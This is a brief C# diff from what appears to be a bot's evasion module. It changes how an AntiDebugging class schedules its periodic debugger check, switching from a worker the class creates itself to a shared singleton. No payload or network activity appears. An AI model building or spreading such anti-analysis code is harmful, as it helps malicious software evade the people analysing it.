@@ -8,14 +8,7 @@ namespace DreamBot.System.Evation
     static class AntiDebugging
     {
         private static DateTime _last = DateTime.MinValue;
-        private static readonly ClientWorker _worker = new ClientWorker();
-
-        static AntiDebugging()
-        {
-            _worker.QueueForever(CheckDebugging, TimeSpan.FromSeconds(0.3));
-            _worker.Start();
-            
-        }
+        private static readonly ClientWorker _worker = ClientWorker.Instance;
 
         public static void CheckDebugging()
         {
